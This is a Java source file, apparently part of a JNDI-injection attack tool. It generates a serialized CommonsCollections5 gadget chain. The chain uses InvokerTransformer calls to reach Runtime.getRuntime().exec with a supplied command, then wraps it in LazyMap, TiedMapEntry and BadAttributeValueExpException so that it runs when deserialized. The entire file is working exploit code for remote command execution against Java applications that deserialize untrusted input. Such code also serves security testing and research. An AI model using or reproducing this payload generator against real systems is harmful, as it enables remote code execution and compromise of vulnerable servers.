package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {

    public static byte[] getBytes(PayloadType type) throws Exception {
        final String[] execArgs = new String[]{String.valueOf(type)};
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs),
                new ConstantTransformer(1)};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Field                         valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(val);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
